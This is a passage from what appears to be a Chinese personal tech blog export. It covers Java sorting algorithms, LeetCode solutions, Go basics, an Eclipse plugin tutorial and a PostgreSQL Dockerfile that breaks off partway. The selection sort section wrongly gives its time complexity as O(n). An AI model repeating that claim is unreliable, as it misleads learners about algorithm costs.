空间复杂度：O(1)。 选择排序选择排序的思想是在剩余的未排序数组里面每次选取最小的放入未排序数组的最前方，重复此步骤，直到排序完成，所以选择排序的时间复杂度很固定。 1234567891011121314public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; int minIndex = i; for (int j = i + 1; j &lt; length; j++) &#123; if (array[j] &lt; array[minIndex]) &#123; minIndex = j; &#125; &#125; int temp = array[i]; array[i] = array[minIndex]; array[minIndex] = temp; &#125;&#125; 时间复杂度：O(n) 空间复杂度：O(1) 插入排序插入排序的思路和打扑克牌的抓牌时候一样，每次抓牌从手牌右到左比较，遇到比自己小的就插入进去，所以时间复杂度不固定，当是增序的时候每次插入最右边，时间复杂度为O(n)，反之则时间复杂度更高为O(n^2)。 123456789101112public void sort(int[] array) &#123; int length = array.length; for (int i = 1; i &lt; length; i++) &#123; int j = i - 1; int temp = array[i]; while (j &gt;= 0 &amp;&amp; array[j] &gt; temp) &#123; array[j + 1] = array[j]; j--; &#125; array[j + 1] = temp; &#125;&#125; 归并排序归并排序的思想是一种分而治之的思想，将一个大的数组分成2部分，每个部分在继续分成两部分，递归直到不能分的时候，然后将子方法获取到的两个部分就是有序的两个数组 采取双指针法 进行排序。 123456789101112131415161718192021222324252627public static int[] sort(int[] arrays) &#123; int length = arrays.length; if (length &lt; 2) &#123; return arrays; &#125; int middle = length/2; int[] left = Arrays.copyOfRange(arrays, 0, middle); int[] right = Arrays.copyOfRange(arrays, middle, length); return merge(sort(left), sort(right));&#125;public static int[] merge(int[] left, int[] right) &#123; int[] target = new int[left.length + right.length]; int i = 0, j = 0, index = 0; while (i &lt; left.length || j &lt; right.length) &#123; if (i == left.length) &#123; target[index++] = right[j++]; &#125; else if (j == right.length) &#123; target[index++] = left[i++]; &#125; else if (left[i] &lt; right[j]) &#123; target[index++] = left[i++]; &#125; else &#123; target[index++] = right[j++]; &#125; &#125; return target;&#125; 时间复杂度：O(nlogn) 空间复杂度：O(n) 快速排序 从数列中挑出一个元素，称为 “基准”（pivot）; 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序； 12345678910111213141516171819202122232425262728public static int[] sort(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition(arrays, left, right); sort(arrays, left, partition - 1); sort(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition(int[] array, int left, int right) &#123; int index = left + 1; for (int i = index; i &lt;= right; i++) &#123; if (array[left] &gt; array[i]) &#123; swap(array, index, i); index++; &#125; &#125; if (array[left] &gt; array[index]) &#123; swap(array, left, index); &#125; return index - 1; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 123456789101112131415161718192021222324252627282930public static int[] sort1(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition1(arrays, left, right); sort1(arrays, left, partition - 1); sort1(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition1(int[] array, int left, int right) &#123; int l = left; int r = right; while (l &lt; r) &#123; while (l &lt; r &amp;&amp; array[l] &lt; array[left]) &#123; l++; &#125; while (l &lt; r &amp;&amp; array[r] &gt;= array[left]) &#123; r--; &#125; swap(array, l, r); &#125; swap(array, l, left); return l; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 时间复杂度O(nlogn) 空间复杂度O(logn) 链表21.合并两个有序列表将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例 1： 12输入：l1 &#x3D; [1,2,4], l2 &#x3D; [1,3,4]输出：[1,1,2,3,4,4] 示例 2： 12输入：l1 &#x3D; [], l2 &#x3D; []输出：[] 示例 3： 12输入：l1 &#x3D; [], l2 &#x3D; [0]输出：[0] 12345678910111213141516171819202122232425262728public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; // 如果list1链表为空 直接挂list2在后面 if (list1 == null) &#123; current.next = list2; break; &#125; // 如果list2链表为空 直接挂list1在后面 if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; list1 = list1.next; &#125; else &#123; current.next = list2; list2 = list2.next; &#125; current = current.next; &#125; return target.next;&#125; 23.合并k个升序链表给你一个链表数组，每个链表都已经按升序排列。 请你将所有链表合并到一个升序链表中，返回合并后的链表。 示例 1： 12345678910输入：lists &#x3D; [[1,4,5],[1,3,4],[2,6]]输出：[1,1,2,3,4,4,5,6]解释：链表数组如下：[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]将它们合并到一个有序链表中得到。1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6 示例 2： 12输入：lists &#x3D; []输出：[] 示例 3： 12输入：lists &#x3D; [[]]输出：[] 1234567891011121314151617181920212223242526272829303132333435363738394041424344public ListNode mergeKLists(ListNode[] lists) &#123; if (lists.length == 0) return null; if (lists.length == 1) return lists[0]; return dep(lists);&#125;public ListNode dep(ListNode[] listNodes) &#123; int length = listNodes.length; if (length == 1) return listNodes[0]; if (length == 2) return mergeTwoLists(listNodes[0], listNodes[1]); int middle = length/2; ListNode left = dep(Arrays.copyOfRange(listNodes, 0, middle)); ListNode right = dep(Arrays.copyOfRange(listNodes, middle, length)); return mergeTwoLists(left, right);&#125;public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; if (list1 == null) &#123; current.next = list2; break; &#125; if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; current = current.next; list1 = list1.next; &#125; else &#123; current.next = list2; current = current.next; list2 = list2.next; &#125; &#125; return target.next;&#125; LCR 023.相交链表给定两个单链表的头节点 headA 和 headB ，请找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。 图示两个链表在节点 c1 开始相交： 题目数据 保证 整个链式结构中不存在环。 注意，函数返回结果后，链表必须 保持其原始结构 。 示例 1： 12345输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3输出：Intersected at &#39;8&#39;解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 12345输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1输出：Intersected at &#39;2&#39;解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 12345输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2输出：null解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。这两个链表不相交，因此返回 null 。 1234567891011public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; ListNode a = headA; ListNode b = headB; while (a != b) &#123; if (a == null) a = headB; else a = a.next; if (b == null) b = headA; else b = b.next; &#125; return a;&#125; 141.环形链表给你一个链表的头节点 head ，判断链表中是否有环。 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。 如果链表中存在环 ，则返回 true 。 否则，返回 false 。 示例 1： 123输入：head &#x3D; [3,2,0,-4], pos &#x3D; 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。 123456789public boolean hasCycle(ListNode head) &#123; ListNode l = head, r = head; while (l != null &amp;&amp; l.next != null &amp;&amp; r.next != null &amp;&amp; r.next.next != null) &#123; l = l.next; r = r.next.next; if (l == r) return true; &#125; return false;&#125; 动态规划72.编辑距离题目：给你两个单词 word1 和 word2， 请返回将 word1 转换成 word2 所使用的最少操作数 。 你可以对一个单词进行如下三种操作： 插入一个字符 删除一个字符 替换一个字符 示例 1： 123456输入：word1 &#x3D; &quot;horse&quot;, word2 &#x3D; &quot;ros&quot;输出：3解释：horse -&gt; rorse (将 &#39;h&#39; 替换为 &#39;r&#39;)rorse -&gt; rose (删除 &#39;r&#39;)rose -&gt; ros (删除 &#39;e&#39;) 递推公式： 123456789对于word1的位置i和word2的位置j1、如果word1[i]和word2[j]相等，则不做任何操作。 2、D[i][j-1] 为 A 的前 i 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们在 A 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i][j-1] + 1；3、D[i-1][j] 为 A 的前 i - 1 个字符和 B 的前 j 个字符编辑距离的子问题。即对于 A 的第 i 个字符，我们在 B 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i-1][j] + 1；4、D[i-1][j-1] 为 A 前 i - 1 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们修改 A 的第 i 个字符使它们相同，那么 D[i][j] 最小可以为 D[i-1][j-1] + 1。特别地，如果 A 的第 i 个字符和 B 的第 j 个字符原本就相同，那么我们实际上不需要进行修改操作。在这种情况下，D[i][j] 最小可以为 D[i-1][j-1]。 123456789101112131415161718192021public int minDistance(String word1, String word2) &#123; int length1 = word1.length(); int length2 = word2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 0; i &lt;= length1; i++) &#123; dp[i][0] = i; &#125; for (int i = 0; i &lt;= length2; i++) &#123; dp[0][i] = i; &#125; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i-1][j-1]; &#125; else &#123; dp[i][j] = Math.min(dp[i-1][j] + 1, Math.min(dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1)); &#125; &#125; &#125; return dp[length1][length2];&#125; LCR095.最长公共子序列题目：给定两个字符串 text1 和 text2，返回这两个字符串的最长 公共子序列 的长度。如果不存在 公共子序列 ，返回 0 。 一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。 例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。 两个字符串的 公共子序列 是这两个字符串所共同拥有的子序列。 示例 1： 123输入：text1 &#x3D; &quot;abcde&quot;, text2 &#x3D; &quot;ace&quot; 输出：3 解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。 123456789101112131415public int longestCommonSubsequence(String text1, String text2) &#123; int length1 = text1.length(); int length2 = text2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (text1.charAt(i - 1) == text2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; &#125; return dp[length1][length2];&#125; 42.接雨水给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。 示例 1： 123输入：height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]输出：6解释：上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 示例 2： 12输入：height &#x3D; [4,2,0,3,2,5]输出：9 1234567891011121314151617181920212223242526272829303132// 解法一 动态规划// 使用一个temp数组存放每个位置能接的雨水// 从左到右 每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，存放在temp[i]里面。// 从右到左，每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，取和temp[i]相比的最小数值即temp[i] = Math.min(temp[i], max-height[i])。// temp数组的加和即为接雨水的大小 public int trap1(int[] height) &#123; if (height.length &lt; 3) &#123; return 0; &#125; int[] temp = new int[height.length]; int max = height[0]; for (int i = 0; i &lt; height.length; i++) &#123; if (height[i] &lt; max) &#123; temp[i] = max - height[i]; &#125; max = Math.max(height[i], max); &#125; max = height[height.length - 1]; for (int i = height.length - 1; i &gt;= 0; i--) &#123; if (height[i] &lt; max) &#123; temp[i] = Math.min(temp[i], max - height[i]); &#125; else &#123; temp[i] = 0; &#125; max = Math.max(height[i], max); &#125; max = 0; for (int i = 0; i &lt; temp.length; i++) &#123; max += temp[i]; &#125; return max; &#125; 12345678910111213141516171819// 解法二 双指针// 左右两个指针，指针移动的时候记录左右的最大值l_max和r_max，当l_max小于r_max的时候，说明左侧是低高度，水的深度取决于左边，即左指针向右走并计算接水量，反之则从右侧往左。\tpublic int trap(int[] height) &#123; int l = 0, r = height.length - 1; int l_max = height[0], r_max = height[height.length - 1]; int res = 0; while (l &lt; r) &#123; l_max = Math.max(l_max, height[l]); r_max = Math.max(r_max, height[r]); if (l_max &lt; r_max) &#123; res += l_max - height[l]; l++; &#125; else &#123; res += r_max - height[r]; r--; &#125; &#125; return res;\t&#125; 双指针end","tags":["算法"],"categories":["算法"]},{"title":"kafka","path":"/2023/04/28/kafka/","content":"Kafka","tags":["kafka"],"categories":["kafka"]},{"title":"go","path":"/2023/04/28/Go/","content":"基础命名命名规则： Go语言中的函数名、变量名、常量名、类型名、语句标号和包名等所有的命名，都遵循一个简单的命名规则：一个名字必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。 包本身的名字一般总是用小写字母，命名一般采用驼峰式，而不是用下划线分割。 关键字： 12345678910111213141516break default func interface selectcase defer go map structchan else goto package switchconst fallthrough if range typecontinue for import return var 内建常量: true false iota nil内建类型: int int8 int16 int32 int64 uint uint8 uint16 uint32 uint64 uintptr float32 float64 complex128 complex64 bool byte rune string error内建函数: make len cap new append copy close delete complex real imag panic recover 可见范围： 如果一个名字是在函数内部定义，那么它就只在函数内部有效。 如果是在函数外部定义，那么将在当前包的所有文件中都可以访问。 如果一个名字是大写字母开头的（译注：必须是在函数外部定义的包级名字；包级函数名本身也是包级名字），那么它将是导出的，也就是说可以被外部的包访问。 声明四种声明形式： var、const、type和func，分别对应变量、常量、类型和函数实体对象的声明。 123456789101112package mainimport &quot;fmt&quot;type my intfunc main() &#123;\tconst i = 3.14\tvar j = i / 2\tconst a my = 1\tfmt.Println(j, a)&#125; 变量123456789var 变量名字 类型 = 表达式 // 去掉表达式会赋默认值，去掉类型会根据表达式来设定类型var s stringfmt.Println(s) // &quot;&quot;// 多变量声明var i, j, k int // int, int, intvar b, f, s = true, 2.3, &quot;four&quot; // bool, float64, string// 函数声明var f, err = os.Open(name) // os.Open returns a file and an error 简短变量声明 1234i := 100j, k := 200, 300i, j = j, i // 交换 i 和 j 的值 注意： “:=”是一个变量声明语句，而“=”是一个变量赋值操作。 new函数每次调用new函数都是返回一个新的变量的地址，因此下面两个地址是不同的： 123p :&#x3D; new(int)q :&#x3D; new(int)fmt.Println(p &#x3D;&#x3D; q) &#x2F;&#x2F; &quot;false&quot; new函数使用通常相对比较少，因为对于结构体来说，直接用字面量语法创建新变量的方法会更灵活（§4.4.1）。 由于new只是一个预定义的函数，它并不是一个关键字，因此我们可以将new名字重新定义为别的类型。例如下面的例子： 1func delta(old, new int) int &#123; return new - old &#125; 由于new被定义为int类型的变量名，因此在delta函数内部是无法使用内置的new函数的。 指针12345x := 1p := &amp;x // p, of type *int, points to xfmt.Println(*p) // &quot;1&quot;*p = 2 // equivalent to x = 2fmt.Println(x) // &quot;2&quot; 变量的生命周期对于在包一级声明的变量来说，它们的生命周期和整个程序的运行周期是一致的。 而相比之下，局部变量的生命周期则是动态的：每次从创建一个新变量的声明语句开始，直到该变量不再被引用为止，然后变量的存储空间可能被回收。 123456789101112var global *intfunc f() &#123; var x int x = 1 global = &amp;x&#125;func g() &#123; y := new(int) *y = 1&#125; f函数里的x变量必须在堆上分配，因为它在函数退出后依然可以通过包一级的global变量找到，虽然它是在函数内部定义的；用Go语言的术语说，这个x局部变量从函数f中逃逸了。相反，当g函数返回时，变量*y将是不可达的，也就是说可以马上被回收的。因此，*y并没有从函数g中逃逸，编译器可以选择在栈上分配*y的存储空间（译注：也可以选择在堆上分配，然后由Go语言的GC回收这个变量的内存空间），虽然这里用的是new方式。其实在任何时候，你并不需为了编写正确的代码而要考虑变量的逃逸行为，要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响。 作用域句法块是由花括弧所包含的一系列语句，就像函数体或循环体花括弧包裹的内容一样。句法块内部声明的名字是无法被外部块访问的。 对全局的源代码来说，存在一个整体的词法块，称为全局词法块；对于每个包；每个for、if和switch语句，也都有对应词法块；每个switch或select的分支也有独立的词法块；当然也包括显式书写的词法块（花括弧包含的语句）。 声明语句对应的词法域决定了作用域范围的大小。对于内置的类型、函数和常量，比如int、len和true等是在全局作用域的，因此可以在整个程序中直接使用。任何在函数外部（也就是包级语法域）声明的名字可以在同一个包的任何源文件中访问的。对于导入的包，例如tempconv导入的fmt包，则是对应源文件级的作用域，因此只能在当前的文件中访问导入的fmt包，当前包的其它源文件无法访问在当前源文件导入的包。还有许多声明语句，比如tempconv.CToF函数中的变量c，则是局部作用域的，它只能在函数内部（甚至只能是局部的某些部分）访问。 基础数据类型操作符优先级 12345* / % &lt;&lt; &gt;&gt; &amp; &amp;^+ - | ^== != &lt; &lt;= &gt; &gt;=&amp;&amp;|| 操作符 123456789101112131415161718== 等于!= 不等于&lt; 小于&lt;= 小于等于&gt; 大于&gt;= 大于等于// 一元的加法和减法运算符：+ 一元加法（无效果）- 负数// 位操作运算符&amp; 位运算 AND| 位运算 OR^ 位运算 XOR&amp;^ 位清空（AND NOT）&lt;&lt; 左移&gt;&gt; 右移 整数12345Go语言同时提供了有符号和无符号类型的整数运算。这里有int8、int16、int32和int64四种截然不同大小的有符号整数类型，分别对应8、16、32、64bit大小的有符号整数，与此对应的是uint8、uint16、uint32和uint64四种无符号整数类型。其中有符号整数采用2的补码形式表示，也就是最高bit位用来表示符号位，一个n-bit的有符号数的值域是从-2n-1到2n-1-1。无符号整数的所有bit位都用于表示非负数，值域是0到2n-1。 int和unit的区别： 浮点数1234Go语言提供了两种精度的浮点数，float32和float64。常量math.MaxFloat32表示float32能表示的最大数值，大约是 3.4e38；对应的math.MaxFloat64常量大约是1.8e308。它们分别能表示的最小值近似为1.4e-45和4.9e-324。 复数1Go语言提供了两种精度的复数类型：complex64和complex128，分别对应float32和float64两种浮点数精度。 12345var x complex128 = complex(1, 2) // 1+2ivar y complex128 = complex(3, 4) // 3+4ifmt.Println(x*y) // &quot;(-5+10i)&quot;fmt.Println(real(x*y)) // &quot;-5&quot;fmt.Println(imag(x*y)) // &quot;10&quot; 数组数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。 123456789101112131415161718192021var a [3]int // 长度为3 默认值都为0var a [3]int = [3]int&#123;1, 2, 3&#125; // 带默认值var a = [...]int&#123;1, 2, 3&#125; // 省略号会自己计算长度// 数组的长度是数组类型的一个组成部分，因此[3]int和[4]int是两种不同的数组类型。数组的长度必须是常量表达式，因为数组的长度需要在编译阶段确定。q := [3]int&#123;1, 2, 3&#125;q = [4]int&#123;1, 2, 3, 4&#125; // compile error: cannot assign [4]int to [3]int// 指定index位置symbol := [...]string&#123;2: &quot;$&quot;, 3: &quot;€&quot;, 1: &quot;￡&quot;, 0: &quot;￥&quot;&#125;fmt.Println(symbol) // [￥ ￡ $ €]// 只有当两个数组的所有元素都是相等的时候数组才是相等的a := [2]int&#123;1, 2&#125;b := [...]int&#123;1, 2&#125;c := [2]int&#123;1, 3&#125;fmt.Println(a == b, a == c, b == c) // &quot;true false false&quot;d := [3]int&#123;1, 2&#125;fmt.Println(a == d) // compile error: cannot compare [2]int == [3]int 切片SliceSlice（切片）代表变长的序列，序列中每个元素都有相同的类型。一个slice类型一般写作[]T，其中T代表slice中元素的类型；slice的语法和数组很像，只是没有固定长度而已。 Slice底层是数组，有len和cap，扩容的时候cap * 2，数据是引用的话改变可能会影响其他的Slice。 Slice没有==判断，因为如果有的话会去比较里面的各个值，里面的值可能是Slice或者interface。 123456789101112131415s := []int&#123;0, 1, 2, 3, 4, 5&#125;fmt.Println(s[1:]) // [1 2 3 4 5]fmt.Println(s[1:3]) // [1 2]fmt.Println(s[:3]) // [0 1 2]fmt.Println(s[:]) // [0 1 2 3 4 5]// 测试一个slice是否是空的，使用len(s) == 0来判断，而不应该用s == nil来判断。var s []int // len(s) == 0, s == nils = nil // len(s) == 0, s == nils = []int(nil) // len(s) == 0, s == nils = []int&#123;&#125; // len(s) == 0, s != nil// 使用make创建make([]T, len)make([]T, len, cap) // same as make([]T, cap)[:len] 底层是数组 append后由于没有空间了，会重新申请一个cap为8的数组。 这样会导致内存的重新分配，所以通常将append的结果在返给原来的变量 1runes = append(runes, r) Map12345678910111213141516171819202122// Map是一个无序的key/value对的集合，其中所有的key都是不同的，然后通过给定的key可以在常数时间复杂度内检索、更新或删除对应的value。// Map的key必须是支持==比较运算符的数据类型。// 通过make来创建Mapages := make(map[string]int) // mapping from strings to ints// 普通创建，可以赋值ages := map[string]int&#123; &quot;alice&quot;: 31, &quot;charlie&quot;: 34,&#125;// 赋值与获取ages[&quot;alice&quot;] = 32fmt.Println(ages[&quot;alice&quot;]) // &quot;32&quot;// 删除delete(ages, &quot;alice&quot;) // remove element ages[&quot;alice&quot;]// 遍历for name, age := range ages &#123; fmt.Printf(&quot;%s\\t%d &quot;, name, age)&#125;","tags":["go"],"categories":["go"]},{"title":"搭建一个简单eclipse插件项目","path":"/2022/06/23/搭建一个简单eclipse插件项目/","content":"引言​ 这里主要记录如何手把手搭建一个eclipse的插件项目。 引入插件​ 由于eclipse插件开发需要plugin插件，所以要先去Help-&gt;Install New Software-&gt;选择对应ecipse版本的https://download.eclipse.org/releases/2022-06/202206151000下载地址-&gt;选择General Purpose Tools下的Eclipse Plug-in Development Environment，然后一路next-&gt;accept-&gt;finish，重启就可以创建一个plugin项目了。 新建项目填入项目名称 点击next，填写vender信息，勾选Generate an activator 点击next，选择创建一个模版，这里选择hello world。 点击next，构建一个handler。 创建完之后我们看下目录结构 文件分析目录里面主要的是plugin.xml这个文件，下面对这个文件进行解析，梳理页面与执行SampleHandler的逻辑。 plugin.xml文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?eclipse version=&quot;3.4&quot;?&gt;&lt;plugin&gt; &lt;extension point=&quot;org.eclipse.ui.commands&quot;&gt; &lt;category id=&quot;demo1.commands.category&quot; name=&quot;Sample Category&quot;&gt; &lt;/category&gt; &lt;!-- 这里定义一个command id为demo1.commands.sampleCommand --&gt; &lt;command categoryId=&quot;demo1.commands.category&quot; name=&quot;Sample Command&quot; id=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/command&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.handlers&quot;&gt; &lt;!-- 将上面定义的command 指定handler处理器，也就是SampleHandler这个类 --&gt; &lt;handler class=&quot;demo1.handlers.SampleHandler&quot; commandId=&quot;demo1.commands.sampleCommand&quot;&gt; &lt;/handler&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.bindings&quot;&gt; &lt;key commandId=&quot;demo1.commands.sampleCommand&quot; schemeId=&quot;org.eclipse.ui.defaultAcceleratorConfiguration&quot; contextId=&quot;org.eclipse.ui.contexts.window&quot; sequence=&quot;M1+6&quot;&gt; &lt;/key&gt; &lt;/extension&gt; &lt;extension point=&quot;org.eclipse.ui.menus&quot;&gt; &lt;menuContribution locationURI=&quot;menu:org.eclipse.ui.main.menu?after=additions&quot;&gt; &lt;!-- 指定一个菜单，菜单显示为Sample Menu --&gt; &lt;menu id=&quot;demo1.menus.sampleMenu&quot; label=&quot;Sample Menu&quot; mnemonic=&quot;M&quot;&gt; &lt;!-- 将前面注册的command绑定到这个菜单里面 --&gt; &lt;command commandId=&quot;demo1.commands.sampleCommand&quot; id=&quot;demo1.menus.sampleCommand&quot; mnemonic=&quot;S&quot;&gt; &lt;/command&gt; &lt;/menu&gt; &lt;/menuContribution&gt; &lt;menuContribution locationURI=&quot;toolbar:org.eclipse.ui.main.toolbar?after=additions&quot;&gt; &lt;toolbar id=&quot;demo1.toolbars.sampleToolbar&quot;&gt; &lt;command id=&quot;demo1.toolbars.sampleCommand&quot; commandId=&quot;demo1.commands.sampleCommand&quot; icon=&quot;icons/sample.png&quot; tooltip=&quot;Say hello world&quot;&gt; &lt;/command&gt; &lt;/toolbar&gt; &lt;/menuContribution&gt; &lt;/extension&gt;&lt;/plugin&gt; SampleHandler.java 文件 1234567891011121314151617181920212223package demo1.handlers;import org.eclipse.core.commands.AbstractHandler;import org.eclipse.core.commands.ExecutionEvent;import org.eclipse.core.commands.ExecutionException;import org.eclipse.ui.IWorkbenchWindow;import org.eclipse.ui.handlers.HandlerUtil;import org.eclipse.jface.dialogs.MessageDialog;public class SampleHandler extends AbstractHandler &#123;\t@Override\tpublic Object execute(ExecutionEvent event) throws ExecutionException &#123; IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindowChecked(event); // 推送弹窗，打印Hello, This is a demo plugin!!! MessageDialog.openInformation( window.getShell(), &quot;Demo1&quot;, &quot;Hello, This is a demo plugin!!!&quot;); return null;\t&#125;&#125; 还有一个Activator类，这个是对插件的生命周期进行管理 getDefault() 取得插件类的实例的方法。插件类是单例的，所以这个方法作为一个静态方法提供。 start() 插件开始时的处理。 stop() 插件停止时的处理。 getLog() log输出时取得ILog用的方法。 getImageRegistry() 取得管理插件内图像的ImageRegistry类。 getPerferenceStore() 取得保存插件设定的IPerferenceStore类。 getDialogSettings() 取得保存对话框设定的IDialogSettings类。 getWorkbench() 取得IWorkbench的实例。 执行调试插件点击左上角的绿色启动按钮 可以看到会新打开一个带有插件的eclipse，可以看到在菜单栏已经有变化，就是插件生效了 接下来我们点击菜单栏的Sample Command，可以看到以下输出 到此，一个简单的eclipse插件就开发完毕了。 参考链接： 引入插件：https://blog.csdn.net/feinifi/article/details/103088082 插件开发：https://www.cnblogs.com/liuzhuo 插件开发：https://blog.csdn.net/feinifi/article/details/106773644","tags":["eclipse"],"categories":["eclipse plugins"]},{"title":"dockerfile基于alpine构建postgresql镜像","path":"/2022/06/21/dockerfile基于alpine构建postgresql镜像/","content":"坏境docker：20.10.10 nginx：1.18.0 podtgres：10.21 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备pgsql的源码包(版本直达)，也可以去pgsql官网处自行下载对应的版本。 准备一个初始化脚本，主要用于创建数据库，用户等等。 准备完之后文件里面内容如下 12345678910╰─$ ls -altotal 50152drwxr-xr-x 8 guoying staff 256 Jun 21 11:42 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1408 Jun 21 22:45 Dockerfile-rw-r--r-- 1 guoying staff 108622 Jun 21 11:38 data.sql-rw-r--r-- 1 guoying staff 640 Jun 21 16:07 start.sh-rw-r--r-- 1 guoying staff 2897 Jun 21 11:38 index.sql-rw-r--r-- 1 guoying staff 128105 Jun 21 11:38 initdb.sql-rw-r--r--@ 1 guoying staff 25419930 Jun 21 09:29 postgresql-10.21.tar.gz 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# build pgsqlFROM alpine:3.16.0ARG user=postgresARG group=postgresWORKDIR /# 将必要文件移入镜像ADD postgresql-10.21.tar.gz /# 创建组和用户 ps：pgsql不允许非root安装RUN addgroup -S $&#123;group&#125; &amp;&amp; adduser \\ --disabled-password \\ --gecos &quot;&quot; \\ --home &quot;/home/postgres&quot; \\ --ingroup &quot;$&#123;group&#125;&quot; \\ --no-create-home \\ # --uid &quot;$UID&quot; \\ &quot;$&#123;user&#125;&quot; &amp;&amp; \\ # 指定apk的aliyun源 echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/repositories &amp;&amp; \\ apk update &amp;&amp; \\ # 安装所需要的环境 apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ readline-dev \\ zlib-dev &amp;&amp; \\ cd /postgresql-10.21 &amp;&amp; \\ # 编译 指定端口8888 ./configure --prefix=/sca/postgresql --with-pgport=8888 &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除缓存和不用的文件 rm -rf /postgresql-10.21 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make &amp;&amp; \\ # 重新安装运行所需要的依赖 apk add 